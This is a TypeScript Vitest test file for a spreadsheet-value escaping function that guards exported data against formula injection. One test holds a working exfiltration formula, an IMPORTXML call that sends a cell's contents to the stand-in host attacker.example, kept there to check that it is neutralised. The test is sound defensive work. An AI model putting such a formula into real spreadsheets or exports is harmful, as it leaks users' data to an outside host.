import { describe, expect, it } from "vitest";

import { escapeRow, escapeSpreadsheetValue } from "./escape";

describe("spreadsheet formula injection", () => {
  it("neutralises every formula-triggering prefix", () => {
    expect(escapeSpreadsheetValue("=1+1")).toBe("'=1+1");
    expect(escapeSpreadsheetValue("+1")).toBe("'+1");
    expect(escapeSpreadsheetValue("-1")).toBe("'-1");
    expect(escapeSpreadsheetValue("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("neutralises a realistic exfiltration payload", () => {
    const attack = '=IMPORTXML(CONCAT("http://attacker.example/?v=",A1),"//a")';
    expect(escapeSpreadsheetValue(attack)).toBe(`'${attack}`);
  });

  it("catches a formula hidden behind leading whitespace", () => {
    // Sheets still parses this as a formula, so trimming must not fool us.
    expect(escapeSpreadsheetValue("   =1+1")).toBe("'   =1+1");
  });

  it("neutralises control characters that break cells apart", () => {
    expect(escapeSpreadsheetValue("\t=1+1")).toBe("'\t=1+1");
    expect(escapeSpreadsheetValue("\rmalicious")).toBe("'\rmalicious");
  });

  it("leaves ordinary text untouched", () => {
    expect(escapeSpreadsheetValue("Campaign key visual")).toBe("Campaign key visual");
    expect(escapeSpreadsheetValue("Popeye's")).toBe("Popeye's");
    expect(escapeSpreadsheetValue("Media - Facebook & Instagram")).toBe(
      "Media - Facebook & Instagram",
    );
  });

  it("writes numbers and booleans without quoting them", () => {
    // A quoted number would land in the sheet as text and break SUM().
    expect(escapeSpreadsheetValue(7.25)).toBe("7.25");
    expect(escapeSpreadsheetValue(0)).toBe("0");
    expect(escapeSpreadsheetValue(true)).toBe("true");
  });

  it("represents null, undefined and empty string as an empty cell", () => {
    expect(escapeSpreadsheetValue(null)).toBe("");
    expect(escapeSpreadsheetValue(undefined)).toBe("");
    expect(escapeSpreadsheetValue("")).toBe("");
  });

  it("escapes a whole row", () => {
    expect(escapeRow(["ok", "=BAD()", 3, null])).toEqual(["ok", "'=BAD()", "3", ""]);
  });

  it("does not double-escape a value that is already text", () => {
    // A name that legitimately starts with an apostrophe stays as one.
    expect(escapeSpreadsheetValue("'quoted")).toBe("'quoted");
  });
});
